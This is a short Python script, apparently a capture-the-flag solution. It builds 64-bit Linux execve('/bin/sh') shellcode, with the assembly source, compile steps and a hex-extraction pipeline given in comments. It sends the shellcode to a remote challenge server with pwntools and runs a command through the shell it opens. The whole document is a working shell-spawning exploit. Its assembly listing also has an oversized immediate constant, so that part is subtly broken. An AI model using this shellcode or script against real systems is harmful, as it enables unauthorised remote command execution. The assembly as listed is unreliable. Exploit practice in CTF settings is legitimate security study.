import pwn
'''
; SHELLCODE arsitektur 64 bit

; compile:
; nasm -gstabs -f elf64 -o bin_sh.o bin_sh.asm && ld bin_sh.o -o bin_sh && ./bin_sh

; generate hex:
; objdump -M Intel -d ./bin_sh |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

section .text
    global _start
_start
    xor rax, rax
    push rax
    mov rdx, rsp
    mov rbx, 0x0068732f6e69622f2f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi,rsp
    add rax, 59
    syscall⏎
'''
SHELLCODE64 = "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
SERVER = ("01.linux.challenges.ctf.thefewchosen.com", 59326)

def send_cmd(cmd):
    with pwn.remote(SERVER[0], SERVER[1]) as r:
        r.recvuntil(b"gimme shellcodez!!!\n")
        r.sendline(SHELLCODE64)
        r.sendline(cmd)
        print(r.recvall(timeout=5))

send_cmd("cat main")